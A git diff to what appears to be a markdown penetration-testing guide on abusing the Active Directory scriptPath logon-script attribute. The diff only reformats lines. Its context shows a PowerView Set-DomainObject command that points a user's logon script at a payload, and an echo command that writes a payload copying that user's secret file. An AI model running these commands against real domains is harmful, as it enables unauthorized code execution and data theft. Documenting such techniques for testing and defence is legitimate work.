@@ -47,7 +47,7 @@ Prepare a script to perform the desired action. Save it in a location accessible
     ```
   #### 2. **Set the `scriptPath` Attribute**
 
-Use PowerView or another AD tool to modify the `scriptPath` of the target user object.
+- Use PowerView or another AD tool to modify the `scriptPath` of the target user object.
 
     ```powershell
     Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\\payload.ps1" }
@@ -58,8 +58,7 @@ Use PowerView or another AD tool to modify the `scriptPath` of the target user o
     ```cmd
     echo "copy C:\Users\Alice\Desktop\secret.txt C:\Temp\copied_secret.txt" > \\temp\\payload.ps1
     ```
-**Set the `scriptPath` Attribute**
-
+- **Set the `scriptPath` Attribute**
     ```powershell
     Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\\payload.ps1" }
     ```
